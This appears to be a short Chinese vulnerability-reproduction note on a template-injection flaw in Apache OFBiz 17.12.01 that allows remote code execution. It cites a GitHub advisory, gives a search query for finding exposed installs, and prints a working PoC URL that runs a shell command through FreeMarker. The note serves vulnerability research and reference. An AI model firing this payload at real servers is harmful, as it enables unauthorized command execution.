---
title: "Apache OfBiz 远程代码执行 RCE"
date: 2026-10-13 09:01:51
categories:
  - WebSecurity
  - CVE
  - "三方组件"
  - "Apache-OFBiz"
tags:
  - "Apache-OFBiz"
  - "代码执行"
  - "SSTI"
  - "漏洞复现"
---
## 漏洞描述

Apache OfBiz 17.12.01 容易受到服务器端模板注入（SSTI）的影响，从而导致远程代码执行（RCE）。

参考链接：

- https://securitylab.github.com/advisories/GHSL-2020-066-apache_ofbiz

## 网络测绘

```
app="Apache_OFBiz"
```

## 漏洞复现

poc：

```
https://localhost/ordermgr/control/FindRequest?foo=bar"ajaxEnabled=false/>${"freemarker.template.utility.Execute"?new()("id")}<FOO
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/framework/Apache-OfBiz-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-RCE.md)
